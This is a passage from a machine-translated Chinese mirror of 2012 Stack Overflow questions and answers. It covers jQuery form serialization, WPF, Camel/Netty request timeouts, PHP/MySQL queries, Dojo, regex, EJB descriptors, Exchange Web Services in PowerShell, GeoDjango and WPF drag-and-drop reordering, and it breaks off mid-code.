# StackOverflow 问答 13076000-13076999

# c# - 如何序列化表单字段并将其发送到服务器，jquery？

> ID：13076001
> 
> 赞同：5
> 
> 时间：2012-10-25T19:42:01.430
> 
> 标签：c#, javascript, jquery

我有一个`HTML`包含多个相同名称字段的表单。例如：

```
 <form action="" method="post" id="form">
    <div class="itemsection" id="item1">
      <input type="text" name="Price" />
      <input type="text" name="Name" />
      <input type="text" name="Catagory" />
    </div>
    <div class="itemsection" id="item2">
      <input type="text" name="Price" />
      <input type="text" name="Product" />
      <input type="text" name="Catagory" />
    </div>
    <div class="itemsection" id="item3">
      <input type="text" name="Price" />
      <input type="text" name="Product" />
      <input type="text" name="Catagory" />
    </div>
  </form> 
```

现在在服务器端（C#），我有一个动作方法和一个模型类`Product`：

```
 //Action method accepts the form on server //It require the Product array 
    public ActionResult SaveItem(Product[] products)
    {
         .....
         ...
    }

    //Model class product
    public Class Product
    {
      public int Id { get; set; }
      public double Price { get; set; }
      public string Name { get; set; }
      public string Catagory { get; set; }
    } 
```

**现在我的问题是：**我正在使用`jquery $.ajax method`. 在服务器端，action 方法接受一个`Product`类数组。现在如何将表单字段转换为`Json`数组（类似于产品数组）。我试过：

```
 $("#form").serialize();  
           &
   $("#form").serializeArray(); 
```

第一个生成所有表单字段的名称-值对，第二个生成所有表单字段的名称-值数组。我的要求是：

```
 //currently my form contains 3 item section so :
   [
    { "Price" : "value", "Name" : "value", "Catagory" : "value" }, 
    { "Price" : "value", "Name" : "value", "Catagory" : "value" }
    { "Price" : "value", "Name" : "value", "Catagory" : "value" }
   ] 
```

谁能告诉我如何通过`JavaScript`or实现这一目标`JQuery`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T19:48:50.583

您可以使用该`map`方法。

```
var data = $('.itemsection').map(function(){
     return {
        Price: $('input[name="Price"]', this).val(),        
        Product: $('input[name="Product"]', this).val(),
        Category: $('input[name="Category"]', this).val()   
     }
}).get(); 
```

[http://jsfiddle.net/KRJJ7/](http://jsfiddle.net/KRJJ7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T19:45:36.900

如果是这种情况，您可以使用`.map()`

```
var arr = $('form :input').map(function() {
              return { 'Price' : $(this).attr('Price') , 
                        'Name' : $(this).attr('Name') ,
                        'Category' : $(this).attr('Category') ,
                      }
          }).get();   // get() will convert them into an array 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T19:51:29.553

您还可以使用 jQuery++ 的 formParams [http://jquerypp.com/#formparams](http://jquerypp.com/#formparams)

# c# - 如何创建多边形的运行时对象？RenderTransform 的值是指什么？

> ID：13076008
> 
> 赞同：0
> 
> 时间：2012-10-25T19:42:47.823
> 
> 标签：c#, wpf, polygon, rendertransform

我将在 WPF 中创建一个六边形并找到这个 XAML 代码：

```
 <Polygon Points="14,0 7,12.1243556529821 -7,12.1243556529821 -14,1.71444889535133E-15 -7.00000000000001,-12.1243556529821 7,-12.1243556529821"
Fill="Black" Stroke="#FF000000" StrokeThickness="1" 
RenderTransform="0.866025403784439,0.5,-0.5,0.866025403784439,31,19.2487113059643" /> 
```

但我有两个问题：

**第一：**
RenderTransform 属性的这些值（0.866025403784439,0.5,-0.5,0.866025403784439,31,19.2487113059643）是什么？

**第二：**
如何从这个 Polygon 创建运行时对象？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T19:58:20.297

[首先：定义MatrixTransform的](http://msdn.microsoft.com/en-us/library/ms635220.aspx)[矩阵](http://msdn.microsoft.com/en-us/library/ms635216.aspx)的是M11、M12、M21、M22、OffsetX 和 OffsetY 六个值。

第二：[多边形](http://msdn.microsoft.com/en-us/library/ms615638.aspx)已经是一个“运行时对象”。你到底什么意思？

# netty - 在 Camel 中使用 Netty 实现请求超时

> ID：13076014
> 
> 赞同：0
> 
> 时间：2012-10-25T19:43:02.130
> 
> 标签：netty, apache-camel

我有一个 Camel 应用程序，它使用 netty 组件通过 TCP 与远程服务器通信。服务器有挂起的趋势，所以我希望能够在请求上添加可配置的超时，这样如果在 X 时间内没有返回响应，我会得到一个异常。

mina 组件在参数中具有此功能`timeout`，但 netty 组件似乎没有相应的选项。

我试着用 a`ReadTimeoutHandler`来完成这个，结果很接近......但不完全是。`HashedWheelTimer`它首先在初始化时创建`CamelContext`：

```
HashedWheelTimer timer = new HashedWheelTimer();
JndiRegistry jndi = new JndiRegistry();
jndi.bind("MyClientPipelineFactory", new MyClientPipelineFactory(timer)); 
```

然后将其添加到我的管道中：

```
public class MyClientPipelineFactory extends ClientPipelineFactory
{
  private final Timer timer;

  public MyClientPipelineFactory(Timer timer) {
    this.timer = timer;
  }

  public ChannelPipeline getPipeline(NettyProducer producer) throws Exception
  {
    ChannelPipeline p = pipeline();
    p.addLast("timeout", new ReadTimeoutHandler(timer, 30));
    // more stuff
    return p;
  }
} 
```

最后，我在路由配置中发现了任何异常：

```
onException(ReadTimeoutException.class)
   .handled(true)
   .process(new Processor() {
      public void process(Exchange exchange) throws Exception {
         Exception exception = (Exception) exchange.getProperty(Exchange.EXCEPTION_CAUGHT);
         throw new ApplicationException("Connection timed out", exception);
      }
   }); 
```

这几乎可以工作。不幸的是，它是特定于渠道的，而不是特定于请求的。因此，只要我与服务器通信，我就没事。但是在我完成 30 秒后，我被`ReadTimeoutException`扔了。问题是它正在寻找网络上的任何活动，而不是我关心的请求/响应对。

我在这里错过了什么吗？是否有使用 Camel+Netty 进行请求超时的固有方法，或者有什么方法可以完成这项`ReadTimeoutException`工作？

（骆驼 2.9.2/Netty 3.3.1）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T08:31:40.320

我对 Camel 不熟悉，但快速浏览一下 Mina 和 Netty 组件表明所需的功能是 Mina 组件的功能，而不是 Mina，并且 Netty 组件中缺少它。在 camel trunk 中，Mina 生产者有一个同步为真时的代码路径，而 Netty 生产者似乎没有类似的功能。将问题带到骆驼邮件列表中可能是值得的。

一种可能的解决方法是创建一个可识别请求/响应的自定义 Netty 处理程序，因此您的管道中有一个处理程序，该处理程序在发送请求时启动计时器，并在收到响应时取消计时器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T11:30:02.580

我想知道我们是否可以为此添加某种支持。在给定的交换请求/回复对上触发超时。

我假设 ReadTimeoutHandler 来自 Netty？我想我们可以在代码中达到峰值，看看我们是否只能在有“进行中”交换的情况下让它触发。

一个技巧也是如何处理如果稍后回复，并且已经触发了超时。然后骆驼需要处理这个以取消处理回复。我不确定这是否那么容易做到。

# php - 无法使用“WHERE s_id IN ($array)”在 mysql 中选择项目

> ID：13076017
> 
> 赞同：0
> 
> 时间：2012-10-25T19:43:14.160
> 
> 标签：php, mysql, arrays, select, where

这是我的问题，我有两个表，其中一个是连接（一列 - 团队 ID，其他 - 人员 ID）我从一个确切的团队中找到所有人员 ID（这里是“t1”）并将其放入一个数组，这里一切正常。

```
$id1 = mysql_query("SELECT id FROM connections WHERE team='t1'");
$id11 = array();
while(($row =  mysql_fetch_assoc($id1))) {
    $id11[] = $row;
}

echo "";
print_r($id11);
echo ""; 
```

直到这里一切正常，在 print_r 中我看到了我想看到的数组项。但从这里 [粪便] 发生。我想从“persons”表中选择人名，该表具有前一个数组（$id11）中的 id。最后我得到一个空数组。

```
$kom1 = mysql_query("SELECT name FROM persons WHERE s_id IN('".join("','", $id11)."')");

//$kom1 = mysql_query("SELECT name FROM persons WHERE s_id IN(".implode(',',$id11).')'); //this one doesnt work too
$kom11 = array();
while(($row1 =  mysql_fetch_assoc($kom1))) {
$kom11[] = $row1;
}

echo "";
print_r($kom11);
echo ""; 
```

什么都试过了，请帮帮我，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T19:45:37.340

试试这个：

```
$id11[] = $row['id']; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:47:40.850

在第二个查询中直接使用子查询：

```
SELECT * FROM blah WHERE boing IN (SELECT id FROM blah2 WHERE team=1337) 
```

应该在每个不那么花哨的数据库中工作

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T19:49:21.183

我的问题是：你为什么要先用两个查询来做这件事？

您可以简单地使用：

```
select p.name from persons p, connections c
where c.team = 't1'
and c.id = p.s_id 
```

（或等效的显式连接）。

# javascript - 将 jQuery 代码转换为 Dojo

> ID：13076020
> 
> 赞同：0
> 
> 时间：2012-10-25T19:43:29.353
> 
> 标签：javascript, jquery, css, class, dojo

我在将`jQuery`代码转换为`Dojo 1.8`代码时遇到问题：

jQuery代码：

```
$(".someclass").css('left', 0); 
```

在尝试使用 Dojo 执行此操作时出现错误：

```
domStyle.set(dojo.query(".collapse"), "left", 0); 
```

据说：`Uncaught TypeError: Cannot set property 'left' of undefined`如果我查询这个类并将其打印到控制台中，我会在其中看到 2 个元素。

我的问题是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T19:50:19.523

`domStyle`如果可以访问节点，则可以使用

```
domStyle.set(aDomNode, "left", 0); 
```

`dojo.query(".collapse")`返回一个节点列表。以下应该有效：

```
require(["dojo/query"], function(query) {
    query(".collapse").style('left', 0);
}); 
```

可以在此处找到有关 dojo 查询引擎的文档

[http://dojotoolkit.org/reference-guide/1.8/dojo/query.html](http://dojotoolkit.org/reference-guide/1.8/dojo/query.html)

[http://dojotoolkit.org/reference-guide/1.8/dojo/NodeList-dom.html#dojo-nodelist-dom](http://dojotoolkit.org/reference-guide/1.8/dojo/NodeList-dom.html#dojo-nodelist-dom)

* * *

这是一个小提琴 [http://jsfiddle.net/cswing/zYH6S/](http://jsfiddle.net/cswing/zYH6S/)

# html - 从 Postgres 到 HTML Web 表单的 JSON

> ID：13076023
> 
> 赞同：1
> 
> 时间：2012-10-25T19:43:35.407
> 
> 标签：html, json, forms

**如何将此 JSON 转换为创建列表框和复选框的可读 HTML？我正在尝试使用 dform 进行转换**

```
 [
                        {
                            "attribute": {
                            "propertyattributecode": "ConstructionDecade",
                            "description": "Based on MPF survey construction decade",
                            "type": "list"
                        },
                            "values": [
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "1960"
                        },
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "1970"
                        },
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "1980"
                        },
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "1990"
                        },
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "2000"
                        },
                        {
                            "propertyattributecode": "ConstructionDecade",
                            "value": "2010"
                        }
                    ] 
```

# regex - 匹配重复字符串的正则表达式

> ID：13076026
> 
> 赞同：-2
> 
> 时间：2012-10-25T19:43:38.917
> 
> 标签：regex

我需要匹配如下文件

```
session1_******.php 
```

我会做这样的事情吗？

```
{session1_}^(.*).php 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T19:46:18.323

此正则表达式将匹配您所寻求的：

```
^session1_.*\.php$ 
```

请注意转义点`\.`表示*文字*点（不是正则表达式“任何字符”）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:46:30.507

最直接的答案

```
^session1_.*\.php$ 
```

克拉 (^) 用于指示字符串的开头或否定字符类（例如 [^abc] ... 表示不是“a”、“b”或“c”），它在正则表达式的中间。

仅当您需要捕获结果时才需要括号。

必须转义句点 (.)。

假设这是您要匹配的整个字符串，则 ^...$ 需要从头到尾完全匹配。如果开头可能有文本删除 ^，或者可能有文本作为结尾删除 $。

# xml - 使用 和 在同一个 ejb-jar.xml

> ID：13076031
> 
> 赞同：1
> 
> 时间：2012-10-25T19:44:03.550
> 
> 标签：xml, jakarta-ee, xml-namespaces, message-driven-bean, ejb-jar.xml

我正在尝试将消息驱动 bean 添加到我现有的 Java EE 应用程序中。我正在修改我的部署描述符 ejb-jar.xml。我的 ejb-jar.xml 看起来像这样。

```
 <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE ejb-jar PUBLIC "-//Sun Microsystems, Inc.//DTD EnterpriseJavaBeans          2.0//EN" "http://java.sun.com/dtd/ejb-jar_2_0.dtd">
    <ejb-jar xmlns="http://java.sun.com/xml/ns/j2ee"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="ejb-jar_1" version="2.1" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee/ejb-jar_2_1.xsd">
          ...
          <enterprise-beans>
                  ...
                  <session> 
                      ...
                      <service-ref> ... <service-ref>
                  </session>
                  <message-driven>
                        <ejb-name>Services</ejb-name>
                        <ejb-class>com.pega.pegarules.internal.etier.mdb.PRJMSListenerBoot</ejb-class>
                        <transaction-type>Container</transaction-type>
                        <message-driven-destination id="MessageDrivenDestination_Services">
                           <destination-type>javax.jms.Queue</destination-type>
                        </message-driven-destination>
                  </message-driven>
                    ...
       </ejb-jar> 
```

当我尝试在 websphere 上部署我的应用程序时，它给了我以下错误。

```
 [10/16/12 17:20:05:671 CDT] 00000024 webapp I com.ibm.ws.webcontainer.webapp.WebApp log SRVE0292I: Servlet Message -   [isclite#isclite.war]:.action: ApplicationDeploymentDetailForm was null.Creating new form bean and storing in session 
    [10/16/12 17:20:19:524 CDT] 00000046 wtp W Parse exception for [ public ID [ null ] and system ID [ null ] ] [ java.lang.IllegalStateException: Parent Translator (EnterpriseBeansTranslator(entity|session|message-driven,1696032023)) did not find a Child Translator for "message-driven-destination". ] 
```

在玩了几天的 xml 文件后，我发现，当我删除上面 ejb-jar 元素中给出的命名空间时，message-driven-destination 被正确翻译，但元素失败，并出现相同的 Child translate not found 错误。

所以我相信这是一个命名空间冲突问题。如果有人可以帮助我解决这个问题，我很感激。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T14:25:35.790

我弄清楚了这个问题。ejb-jar-2.1.xsd 已弃用消息驱动类型中的消息驱动目标元素。message-driven-destination 是 ejb-jar_2.0 规范的一部分。这是从 2.0 到 2.1 的转换：

EJB 2.0 中消息驱动的 bean 元素的示例：

```
 <message-driven id="Mdb20">
       <ejb-name>Mdb</ejb-name>
       <ejb-class>ejbs.MdbBean</ejb-class>
       <transaction-type>Bean</transaction-type>
       <message-selector>mdbMessage</message-selector>
       <acknowledge-mode>Auto-acknowledge</acknowledge-mode>
       <message-driven-destination>
      <destination-type>javax.jms.Topic</destination-type>
      <subscription-durability>Durable</subscription-durability>
       </message-driven-destination>
   </message-driven> 
```

EJB 2.1 中的消息驱动 bean 元素示例：

```
<message-driven id="Mdb21">
   <ejb-name>Foo/ejb-name>
   <ejb-class>ejbs.FooBean</ejb-class>
   <messaging-type>javax.jms.MessageListener</messaging-type>
   <transaction-type>Bean/transaction-type>
   <message-destination-type>javax.jms.Topic</message-destination-type>
    <activation-config>
 <activation-config-property>
   <activation-config-property-name>destinationType</activation-config-property-name>
   <activation-config-property-value>javax.jms.Topic</activation-config-property-value>
 </activation-config-property>
 <activation-config-property>
   <activation-config-property-name>subscriptionDurability</activation-config-property-name>
     <activation-config-property-value>Durable</activation-config-property-value>
  </activation-config-property>
  <activation-config-property>
     <activation-config-property-name>acknowledgeMode</activation-config-property-name>
     <activation-config-property-value>AutoAcknowledge</activation-config-property-value>
  </activation-config-property>
  <activation-config-property>
    <activation-config-property-name>messageSelector</activation-config-property-name>
    <activation-config-property-value>fooSelector</activation-config-property-value>
  </activation-config-property>
 </activation-config>
</message-driven> 
```

# c# - 当我添加对项目的引用时，Visual Studio/Tools 可以向我显示循环依赖图吗？

> ID：13076033
> 
> 赞同：17
> 
> 时间：2012-10-25T19:44:07.573
> 
> 标签：c#, visual-studio-2010

我正在使用具有大量项目的解决方案。我正在尝试将一些 peices 重构为 Common 库。但是，在添加一些项目引用时，我得到了循环依赖错误。我试图从我的 VS 解决方案中删除未使用的引用，但循环依赖仍然存在。

您是否知道任何可以帮助我了解循环依赖的 VS 扩展或外部工具。我也有 Resharper，但我不知道代码清理是否可以帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2016-02-29T04:50:26.673

这是一个古老的问题，但由于它没有公认的答案......

至少在 VS 2015 Enterprise 中，您可以在解决方案资源管理器中右键单击您的解决方案并选择`Show Project Dependency Diagram`. 这将加载解决方案中的依赖关系图。对于大型解决方案非常有用。

[![在此处输入图像描述](../Images/48dc187fc7bdb685513f562397559617.png)](https://i.stack.imgur.com/hqdzl.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-14T10:04:43.650

“右键单击项目”->“项目依赖项”并检查您是否在此处设置了依赖项，因为这可能是您的问题的原因（当然我假设您在“参考”中没有循环依赖项）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-18T19:13:58.190

有一个类似的问题，建议使用以下工具： [c# : Utility to find circular references / compile in correct order?](https://stackoverflow.com/questions/1669696/c-sharp-utility-to-find-circular-references-compile-in-correct-order)

该工具：[http ://www.ndepend.com/features/dependency-cycles#DependencyCycle](http://www.ndepend.com/features/dependency-cycles#DependencyCycle)

# powershell - 根据 Id 和 ParentFolderId 解析从 EWS 返回的项目的完整路径

> ID：13076034
> 
> 赞同：1
> 
> 时间：2012-10-25T19:44:08.073
> 
> 标签：powershell, recursion, exchangewebservices

我让自己有点晕头转向。

我正在尝试通过 Powershell 和 Exchange Webservices API 获取 Exchange 2010 邮箱的全部内容。

到了我实际拥有文件夹和邮件项目的地步，一切都会好起来的。

我需要能够添加每个单独邮​​件项目的完整文件夹路径，以便当我将整个内容导出到 xml og csv 时，我可以按文件夹的路径对电子邮件进行分组。

我能够很好地检索文件夹和电子邮件。

这是我从某个文件夹中获取邮件的方式：

```
$ExchangeFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService, [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::$FolderName)
[array] $ExchangeItems = $ExchangeFolder.FindItems($ItemLimit)

$PropertySet = New-Object
Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
$PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::$BodyType

foreach ($ExchangeItem in $ExchangeItems)
{
    $ExchangeItem.Load($PropertySet)
    Write-Output $ExchangeItem 
} 
```

以及我获取文件夹的方式：

```
$RootFolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$MailboxName)
$RootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,$RootFolderId) 
$FolderView = New-Object Microsoft.Exchange.WebServices.Data.FolderView(10000); 
$FolderView.Traversal = [Microsoft.Exchange.WebServices.Data.FolderTraversal]::Deep
$FolderView.PropertySet = $Propset 
$FolderResponse = $RootFolder.FindFolders($FolderView); 
```

邮件通过 映射到它们的文件夹，`ParentFolderId`并且文件夹有自己的`Id`以及`ParentFolderId`.

从这些信息中，我的意思是能够以某种方式抓住一个随机文件夹，并通过`ParentFolderId`能够告诉它的完整路径。我想，这与制作递归函数有关，但我似乎无法理解它。

我认为我现在的计划是：

1.  `Deep`我将使用文件夹遍历而不是文件夹遍历`Shallow`，它只给我当前绑定到的文件夹的子文件夹。
2.  遍历文件夹并创建一个由文件夹的`Id`as 键和它们的`DisplayName`as 值组成的哈希映射。向文件夹对象添加一个新属性。类似的东西`\\<foldername>`。
3.  那些有孩子的文件夹将被一次提取一层，我将`ParentFolderId`在哈希图中查找它们，并将使用提取的值更新并附加它们自己的值`DisplayName`以获得它们的绝对位置 - 例如`\\Inbox`从父级并将其附加到他们自己的`DisplayName`，这可能是`Economy`导致`\\Inbox\Economy`路径的东西，就像在（1）中一样，我将添加到对象中。
4.  重复此过程，直到所有文件夹都已处理和映射。从`ParentFolderId`邮件中，我现在应该能够知道他们的绝对位置。我认为...

抱歉，如果以上内容一团糟，我对递归函数和 EWS 的速度都不太了解。

任何帮助将不胜感激，如果您需要我澄清任何细节，请询问。

在此先感谢基督教

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-09-15T22:22:15.473

我遇到了这个问题并使用递归函数来找出电子邮件项目的完整路径。（我也是新手。这可能不是最好的方法，但它有效）

1.  获取所有文件夹以存储“ID”和“ParentFolderId”属性。

```
 $view = New-Object Microsoft.Exchange.WebServices.Data.FolderView(999)
    $view.PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.Webservices.Data.BasePropertySet]::FirstClassProperties)
    $view.PropertySet.Add([Microsoft.Exchange.Webservices.Data.FolderSchema]::DisplayName)
    $view.Traversal = [Microsoft.Exchange.Webservices.Data.FolderTraversal]::Deep
    $findFolderResults = $service.FindFolders([Microsoft.Exchange.Webservices.Data.WellKnownFolderName]::MsgFolderRoot, $view) 
```

2.  将找到的文件夹属性以及您要查找的电子邮件项目的父文件夹 ID 传递给递归函数。

```
 function jjRecursion{
      param (
      [Parameter(Mandatory=$true, Position=0)]
      $results,
      [Parameter(Mandatory=$true, Position=1)]
      $Id
      )
    $fullPath = @()
    $results | % {
        if ($_.id.UniqueId -eq $Id) {
            $fullPath += $($_.displayname)
            jjRecursion $results $_.ParentFolderId.UniqueId
        }
        else {}
    }
    RETURN $fullPath
    }

    $findPath = jjRecursion $findFolderResults $Item.ParentFolderId.UniqueId 
```

# c# - 异步客户端套接字 - 构造回字节数组

> ID：13076036
> 
> 赞同：0
> 
> 时间：2012-10-25T19:44:11.787
> 
> 标签：c#, sockets, asynchronous, bytearray

问题：我想知道如何从流中获取所有数据。

我正在将数据从异步客户端套接字的`BeginSend`方法发送到客户端的方法`BeginReceive`。现在的目标是获取通过流的所有字节。

我创建了一个`StateObject`类，其中包括一个缓冲区字段类型`byte[]`，并且它具有固定长度（当前设置为 2048）。

那么如何将检索到的字节传递给该字段呢？请记住，数据是零散的，而不是一次性的。

我必须将所有字节构造回来，因为它们是从服务器发送的。

我可以使用`Array.Copy()`or`Buffer.BlockCopy`方法，它可以完成工作吗？

关键是我必须考虑多个条件：

*   假设 buffer[2048] 的所有索引都设置为 0

*   在第一次复制中，起始索引将为 0（然后添加从流中获取的字节）

*   在所有接下来的复制中，起始索引必须是数组中的第一个零（或者换句话说，所有先前复制到数组的字节的总和 - 1）。

如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:14:37.840

每次触发 ReadCallback 时，缓冲区中都有 >0 字节（否则连接断开）以及在此数据块中接收到的实际字节数。每个新数据块都从缓冲区中的索引 0 开始。在每次读取回调时使用`var message = new MemoryStream()`and `message.Write(buffer,0, bytes_received)`，直到收到所有数据。这将是最快的方式。

# python - 在 Django 中返回距离对象

> ID：13076048
> 
> 赞同：3
> 
> 时间：2012-10-25T19:45:13.623
> 
> 标签：python, django, geodjango

我有一个像这样的小功能：

```
from django.contrib.gis.measure import Distance

def RailTest(mod_ewdim, mod_ewspacing, cols): 
    y = Distance(inch=mod_ewspacing)
    x = Distance(inch=mod_ewdim)
    z = Distance(inch=3)
    l = ( (x*cols)+(y*(cols-1)) )+z
    return l 
```

但是，当我调用该函数并执行`type(l)`它时，它的类型为`float`. 我怎样才能确保我返回一个距离对象。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T19:50:32.467

您是否尝试过以下操作？

```
return Distance(inch=l) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T19:56:28.267

你有没有尝试过

```
return Distance(inch=l) 
```

# facebook-graph-api - 发生意外的错误。请稍后重试您的请求

> ID：13076052
> 
> 赞同：3
> 
> 时间：2012-10-25T19:45:30.927
> 
> 标签：facebook-graph-api

我对打开图表有疑问。当我使用调试 facebook 工具时，出现以下错误消息：

```
"error": {
  "message": "An unexpected error has occurred. Please retry your request later.",
  "type": "OAuthException",
  "code": 2
} 
```

当我将 Graph API Explorer 与令牌生成器一起使用时：

输入帖子：[https](https://graph.facebook.com/1145358260/univercial:read) ://graph.facebook.com/1145358260/univercial:read 添加新字段：课程 [http://www.filmslive.net/cours-6](http://www.filmslive.net/cours-6)

没关系！！！

这是我的代码：

```
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="fr-FR" xmlns:fb="https://www.facebook.com/2008/fbml"> 
<head prefix="og: http://ogp.me/ns# univercial: http://ogp.me/ns/apps/univercial#">
    <title>Univercial | Read <?php echo $nom; ?>Lesson</title>
    <meta property="fb:app_id" content="429852050395283" /> 
    <meta property="og:type" content="univercial:Lesson" /> 
    <meta property="og:url" content="http://www.filmslive.net/cours-6">
    <meta property="og:title" content="Read <?php echo $nom; ?> Lesson" /> 
    <meta property="og:description" content="1ére Plateform d'interraction entre les jeunes étudiants du Maroc" /> 
    <meta property="og:image" content="http://www.filmslive.net/images/200_200.jpg" /> 
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <link href="css/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
    <div id="fb-root"></div>
    <script>
        window.fbAsyncInit = function() {
            FB.init({
                appId      : '429852050395283', // App ID
                status     : true, // check login status
                cookie     : true, // enable cookies to allow the server to access the session
                xfbml      : true
            });
        };

        (function(d){
            var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
            js = d.createElement('script'); js.id = id; js.async = true;
            js.src = "//connect.facebook.net/fr_FR/all.js";
            d.getElementsByTagName('head')[0].appendChild(js);
        }(document));

        function postRead() {
            FB.api('/me/univercial:Read?Lesson=http://www.filmslive.net/cours-6', 'post', function(response) {
               if (!response || response.error) {
                    alert('erreur');
                } else {
                    alert('ok');
                }
            });
        }
    </script>
                            <form>
                                <input class="float_left bouton_vert" type="button" value="Read" onclick="postRead()" />
                            </form> 
```

结果：警报（'erreur'）

我可以使用提要，但不能使用 publish_actions。

# c# - WPF 中的 ItemsControl 是否有一个很好的解决方案，可以通过垂直拖放对其元素进行重新排序？

> ID：13076056
> 
> 赞同：2
> 
> 时间：2012-10-25T19:45:36.157
> 
> 标签：c#, .net, wpf, draggable, attachedbehaviors

所以这是我正在使用的场景：

我有一个优先级列表，当前表示为一个 ItemsControl/ListView，绑定到一个可观察的优先级项目集合。我想为元素重新排序提供严格的视觉约束垂直拖动。

所以，没有拖动装饰器，没有水平移动，只有垂直移动。当一个列表项移过另一个项的中点时，它应该通过动画“交换位置”。我确信这可以通过在容器本身上使用 mousedown/mousemove 来完成，并且我确信可以应用渲染转换来做到这一点，但我理想的解决方案将有两个组件：

1.  该功能可以作为 WPF 交互[行为](http://wpftutorial.net/Behaviors.html)附加。

2.  该系统将是 MVVM 友好的，并且不需要任何重要的代码。

这已经完成了吗？我在哪里可以找到它？如果还没有，我怎么能把所有的位放在一起来做到这一点？

编辑：**赏金打开。请通过评论直接向我提问，我会尽快回复。**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T22:28:10.973

而对于代码...

加价：

```
<AdornerDecorator Margin="5">
    <ListBox x:Name="_listBox" Width="300" 
              HorizontalAlignment="Left"
              ItemsSource="{Binding Path=Items}" 
          AllowDrop="True" Drop="listBox_Drop">
        <ListBox.ItemContainerStyle>
            <Style TargetType="{x:Type ListBoxItem}">
                <EventSetter Event="ListBoxItem.DragOver"  Handler="listBoxItem_DragOver"/>
                <EventSetter Event="ListBoxItem.Drop" Handler="listBoxItem_Drop"/>
                <EventSetter Event="ListBoxItem.MouseMove" Handler="listBoxItem_MouseMove"/>
                <EventSetter Event="ListBoxItem.MouseDown" Handler="listBoxItem_MouseDown"/>
                <EventSetter Event="ListBoxItem.PreviewMouseDown" Handler="listBoxItem_MouseDown"/>
                <Setter Property="AllowDrop" Value="True"/>
            </Style>
        </ListBox.ItemContainerStyle>
    </ListBox>
</AdornerDecorator> 
```

和代码隐藏：

```
private bool _isDragging;

    private void listBox_MouseDown(object sender, MouseButtonEventArgs e)
    {
        _isDragging = false;
    }

    Adorner _adorner;

    private void listBox_MouseMove(object sender, MouseEventArgs e)
    {
        if (!_isDragging && e.LeftButton == MouseButtonState.Pressed)
        {
            _isDragging = true;

            if (_listBox.SelectedValue != null)
            {
                DragDrop.DoDragDrop(_listBox, _listBox.SelectedValue,
                   DragDropEffects.Move);
            }

        }
    }

private ListBoxItem FindlistBoxItem(DragEventArgs e)
    {
        var visualHitTest = VisualTreeHelper.HitTest(_listBox, e.GetPosition(_listBox)).VisualHit;

        ListBoxItem listBoxItem = null;

        while (visualHitTest != null)
        {
            if (visualHitTest is ListBoxItem)
            {
                listBoxItem = visualHitTest as ListBoxItem;

                break;
            }
            else if (visualHitTest == _listBox)
            {
                Console.WriteLine("Found listBox instance");
                return null;
            }

            visualHitTest = VisualTreeHelper.GetParent(visualHitTest);
        }

        return listBoxItem;
    }

    void ClearAdorner()
    {
        if (_adorner != null)
        {
            var adornerLayer = AdornerLayer.GetAdornerLayer(_listBox);
            adornerLayer.Remove(_adorner);
        }
    }

    private void listBox_DragOver(object sender, DragEventArgs e)
    {
        e.Effects = DragDropEffects.Move;

        ClearAdorner();

        var listBoxItem = FindlistBoxItem(e);

        if (listBoxItem == null || listBoxItem.DataContext == _listBox.SelectedItem) return;

        if (IsInFirstHalf(listBoxItem, e.GetPosition(listBoxItem)))
        {
            var adornerLayer = AdornerLayer.GetAdornerLayer(_listBox);
            _adorner = new DropBeforeAdorner(listBoxItem);
            adornerLayer.Add(_adorner);
        }
        else if (IsInLastHalf(listBoxItem, e.GetPosition(listBoxItem)))
        {
            var adornerLayer = AdornerLayer.GetAdornerLayer(_listBox);
            _adorner = new DropAfterAdorner(listBoxItem);
            adornerLayer.Add(_adorner);
        }

    }

    private void listBox_Drop(object sender, DragEventArgs e)
    {
        if (_isDragging)
        {
            _isDragging = false;
            ClearAdorner();

            var listBoxItem = FindlistBoxItem(e);

            if (listBoxItem == null || listBoxItem.DataContext == _listBox.SelectedItem) return;

